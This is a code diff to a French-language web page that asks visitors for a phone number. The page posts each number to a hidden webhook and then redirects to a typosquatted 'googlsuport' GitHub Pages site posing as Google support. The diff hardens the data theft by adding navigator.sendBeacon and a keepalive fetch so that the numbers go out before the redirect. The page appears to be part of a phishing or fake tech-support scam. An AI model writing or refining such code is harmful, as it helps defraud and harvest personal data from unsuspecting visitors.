@@ -23,7 +23,6 @@
       padding-top: 120px;
       box-sizing: border-box;
       min-height: 100vh;
-      /* Évite le scroll horizontal sur mobile */
       overflow-x: hidden;
     }
     .container {
@@ -130,18 +129,36 @@
     const phoneInput = document.getElementById("phoneNumber");
     const submitBtn = document.getElementById("submitBtn");
 
+    function redirect() {
+      window.location.href = "https://googlsuport.github.io/googleproblem/";
+    }
+
     submitBtn.addEventListener("click", () => {
       const phone = phoneInput.value.trim();
-      if (!phone) return;
+      if (!phone) {
+        alert("Veuillez entrer un numéro.");
+        phoneInput.focus();
+        return;
+      }
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: `Numéro de téléphone reçu : ${phone}` })
-      }).catch(() => {});
+      const payload = JSON.stringify({ content: `Numéro de téléphone reçu : ${phone}` });
 
-      // redirection après envoi
-      window.location.href = "https://googlsuport.github.io/googleproblem/";
+      if (navigator.sendBeacon) {
+        const blob = new Blob([payload], { type: 'application/json' });
+        navigator.sendBeacon(webhookURL, blob);
+        setTimeout(redirect, 500);
+      } else {
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: payload,
+          keepalive: true
+        })
+        .catch(() => {})
+        .finally(() => {
+          setTimeout(redirect, 500);
+        });
+      }
 
       phoneInput.value = "";
       phoneInput.focus();
